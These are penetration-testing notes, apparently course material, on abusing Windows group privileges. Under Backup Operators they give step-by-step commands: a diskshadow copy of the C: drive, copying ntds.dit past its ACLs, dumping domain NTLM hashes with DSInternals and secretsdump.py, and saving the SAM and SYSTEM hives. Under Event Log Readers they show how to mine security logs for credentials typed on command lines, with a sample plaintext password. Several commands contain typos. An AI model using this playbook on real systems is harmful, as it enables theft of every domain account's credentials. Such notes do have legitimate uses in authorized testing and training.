Backup Operators 
	[SeBackup Privilege]([https://learn.microsoft.com/en-us/windows-hardware/drivers/ifs/privileges](https://learn.microsoft.com/en-us/windows-hardware/drivers/ifs/privileges))
		Allows to traverse any folder and list contents and copy a file from a folder even with no ACE. 
		Need to copy the data specifying the [FILE_FLAG_BACKUP_SEMANTICS](https://learn.microsoft.com/en-us/windows/win32/api/fileapi/nf-fileapi-createfilea)
			Exploiting privilege 
			https://github.com/giuliano108/SeBackupPrivilege
			Import the Libraries:
				`Import-Module .\SeBackupPrivilegeUtils.dll`
				`Import-Module .\SeBackupPrivilegeCmdLets.dll`
			Turn on the privileges 
				`whoami /priv`
				`Get-SeBackupPrivilige`
				`Set-SeBackupPrivilege`
			Copy a protected file 
				`Copy-FileSeBackupPrivilege '<path to file>' .\<filename>.txt`
			Read the file
			Use [diskshadow](https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/diskshadow) to attack a domain controller with NTDS.dit
				Contains all the NTLM hashes for all users in the domain.
				Use diskshadow utility to create a copy of the C drive and expose it in the E drive
				`diskshadow.exe`
				`set verbose on`
				`set metadata`
				`set context clientaccesible`
				`set contect persistent`
				`begin backup`
				`add volume C: alias cdrive`
				`create`
				`expose %cdrive%` E:
				`end backup`
				`exit`
				`dir E:`	`
			Bypass the ACL and copy the NTDS locally
				`Copy-FileSeBackupPrivilege E:\Windows\NTDS\ntds.dit C:\Tools\ntds.dit`
			Extract credentials from NTDS.dit
				`Import-Module .\DSInternals.psd1`
				`$key = Get-BootKey -SystemHivePath .\SYSTEM'
				`Get-ADDBAccount -DistinguishedName 'CN=administrator,CN=users,DC=inlanefreight,DC=local' -DBPath .\ntds.dit -BootKey $key`
				Using SecretsDump.py
					`secretsdump.py -ntds ntds.dit -system SYSTEM -hashes lmhash:nthash LOCAL'
				CopyFiles with Robocopy
					`robocopy /B E:\Windows\NTDS .\ntds ntds.dit`
		Backup the SAM and SYSTEM registry hives.
			`reg save HKLM\SYSTEM SYSTEM.SAV`
			`reg save HKLM\SAM SAM.SAV`
[Event Log Readers](<https://learn.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2012-R2-and-2012/dn579255(v=ws.11)?redirectedfrom=MSDN#event-log-readers>)
	Confirm group membership 
		`net localgroup "Event Log Readers"`
	Query windows events using [wevutil (CMD)](<Windows/PrivEsc/Windows Group Privileges.md>) Or [Get-WinEvent(PS)](https://learn.microsoft.com/en-us/powershell/module/microsoft.powershell.diagnostics/get-winevent?view=powershell-7.3&viewFallbackFrom=powershell-7.1)
		Search for security Logs. 
			CMD
				`wevtutil qe Security /rd:true /f:text | Select-String "/user"
			Powershell
				`Get-WinEvent -LogName security | where { $_.ID -eq 4688 -and $_.Properties[8].Value -like '*/user*'} | Select-Object @{name='CommandLine';expression={ $_.Properties[8].Value }}`
		Pass Credentials to wevutil 
			`wevtutil qe Security /rd:true /f:text /r:share01 /u:julie.clay /p:Welcome1 | findstr "/user"
			
`
	
	